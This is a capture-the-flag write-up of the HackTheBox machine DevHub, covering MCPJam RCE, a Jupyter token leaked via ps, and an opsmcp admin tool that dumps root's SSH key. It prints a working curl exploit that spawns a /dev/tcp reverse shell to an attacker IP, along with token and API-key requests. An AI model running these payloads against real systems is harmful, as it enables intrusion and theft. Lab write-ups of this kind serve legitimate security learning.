---
title: "DevHub"
description: "HackTheBox Season 11 — MCPJam RCE to a Jupyter token leak, then an opsmcp admin tool that dumps root's SSH key."
---

<a href="https://labs.hackthebox.com/achievement/machine/1439304/903" style="display:block;max-width:560px;margin:1.5rem auto;text-decoration:none;border-radius:14px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:system-ui,-apple-system,sans-serif;">
  <div style="height:104px;background:#141D2B url('https://labs.hackthebox.com/images/achievementBG.png') center/cover;position:relative;">
    <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e13a3f-a4e4-4757-94e4-32b2e0d693c0-1779887169.png" alt="DevHub" width="76" height="76" style="position:absolute;left:50%;bottom:-38px;transform:translateX(-50%);border-radius:50%;background:#1A2332;box-shadow:0 0 0 4px #1A2332;" />
  </div>
  <div style="background:#1A2332;padding:52px 20px 22px;text-align:center;">
    <div style="color:#fff;font-size:1.2rem;font-weight:600;">DevHub has been Pwned</div>
    <div style="height:1px;margin:14px auto;max-width:240px;background:linear-gradient(to right,transparent,#9FEF00,transparent);"></div>
    <div style="color:#A4B1CD;font-size:.9rem;"><span style="color:#fff;">d10m3d3s</span> pwned this machine</div>
    <div style="display:flex;justify-content:center;margin-top:20px;">
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">#479</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">MACHINE RANK</div></div>
      <div style="flex:1;padding:4px;border-left:1px solid #111927;border-right:1px solid #111927;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">30 May 2026</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">PWN DATE</div></div>
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">845</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">XP EARNED</div></div>
    </div>
  </div>
</a>

**DevHub** is a Linux box themed around the **Model Context Protocol** tooling.
An exposed **MCPJam** inspector lets us spawn an arbitrary MCP "server" command —
instant RCE as `mcp-dev`. From there, a co‑tenant `analyst` runs **Jupyter Lab**
bound to localhost with its **token printed in the process list**, giving us a
shell as `analyst`. Finally, a root‑owned **opsmcp** service exposes an admin
tool that will happily dump root's SSH private key.

:::note[Attack path at a glance]
`MCPJam RCE` (CVE‑2026‑23744) → shell as **mcp-dev** → leaked Jupyter token in
`ps aux` → **analyst** → **opsmcp** `ops._admin_dump` (ssh_keys) → root `id_rsa`
→ **root**.
:::

## Reconnaissance

### Nmap

```text title="nmap -sVC 10.129.5.55"
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH and nginx are exposed externally; the interesting services turn out to
be internal.

```bash
echo '10.129.5.55 devhub.htb' | sudo tee -a /etc/hosts
```

## Web Enumeration

The app surface points at **MCP** tooling:

- **MCPJam** (MCP Inspector) on port `6274`
- A **Jupyter** dashboard on `localhost:8888` (per its title page)
- Something on `localhost:5000` — later identified as an **opsmcp** server

MCPJam reports version **1.4.2**, which is vulnerable to
**`CVE-2026-23744`** — unauthenticated remote code execution.

## Foothold — MCPJam RCE

MCPJam's `/api/mcp/connect` endpoint lets a client define the command used to
launch an MCP server, and the app spawns it directly. Point that command at a
reverse shell:

```bash title="CVE-2026-23744 — MCPJam RCE"
curl --path-as-is -s -k -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.64/4444 0>&1"],"env":{}},"serverId":"shell"}' \
    'http://devhub.htb:6274/api/mcp/connect'
```

This lands a shell as **`mcp-dev`**. `/etc/passwd` shows a second interactive
user we need to reach:

```text title="/etc/passwd (excerpt)"
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```

## Local Enumeration

Loopback‑only services confirm what's really running:

```text title="ss -ltnp"
Proto  Local Address       State   PID/Program name
tcp    0.0.0.0:22          LISTEN  -
tcp    0.0.0.0:80          LISTEN  -
tcp    0.0.0.0:6274        LISTEN  1282/node
tcp    127.0.0.1:8888      LISTEN  -
tcp    127.0.0.1:5000      LISTEN  -
```

| Port | Bind      | Service                         |
| ---- | --------- | ------------------------------- |
| 6274 | 0.0.0.0   | MCPJam inspector (node)         |
| 8888 | 127.0.0.1 | Jupyter Lab (TornadoServer)     |
| 5000 | 127.0.0.1 | `opsmcp` server (`server.py`)   |

Port `8888` speaks Tornado and redirects to `/lab` — Jupyter Lab:

```http title="curl -v localhost:8888"
< HTTP/1.1 302 Found
< Server: TornadoServer/6.5.4
< Location: /lab?
```

The **process list leaks the Jupyter token** and reveals that `opsmcp` runs as
**root**:

```text title="ps aux | grep -E 'jupyter|opsmcp'"
analyst  1045 ... jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser \
    --notebook-dir=/home/analyst/notebooks \
    --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 ...
root     1051 ... /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

:::caution
Jupyter's `--ServerApp.token=` on the command line is world‑readable via
`/proc`. Anyone with a shell on the host can read it and authenticate.
:::

## Lateral Movement — analyst via Jupyter

Forward `8888` to your machine (or curl it directly from the `mcp-dev` shell) and
authenticate with the leaked token. Jupyter Lab's built‑in **Terminal** then
drops a shell as **`analyst`** — no kernel gymnastics needed.

If you'd rather stay on the command line, the kernel API accepts the same token:

```bash title="Jupyter kernel API (alternative)"
curl -s -X POST "http://localhost:8888/api/kernels" \
    -H "Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7" \
    -H "Content-Type: application/json"
# {"id": "0d47c94b-...", "name": "python3", "execution_state": "starting"}
```

That's the **user** foothold as `analyst`.

## Privilege Escalation — opsmcp admin dump

The root‑owned `opsmcp` server on `127.0.0.1:5000` exposes a `tools/call` API.
Its source (`/opt/opsmcp/server.py`) reveals the admin key and a privileged
`ops._admin_dump` tool that can read sensitive files — including SSH keys — as
root:

```bash title="opsmcp — dump root SSH key"
curl -s -X POST "http://localhost:5000/tools/call" \
    -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
    -H "Content-Type: application/json" \
    -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

This returns root's `id_rsa`. Save it and log in:

```bash
chmod 600 root_id_rsa
ssh -i root_id_rsa root@devhub.htb
```

## Takeaways

- **"Connect to an MCP server" is arbitrary command execution.** MCPJam spawns a
  client‑supplied command, so an exposed inspector is a straight RCE.
- **Secrets on the command line aren't secret.** The Jupyter token in `ps aux`
  was the entire lateral‑movement step.
- **Privileged "admin" tools need real authz.** A single static API key guarding
  a root‑level "dump anything" action collapses the whole box.
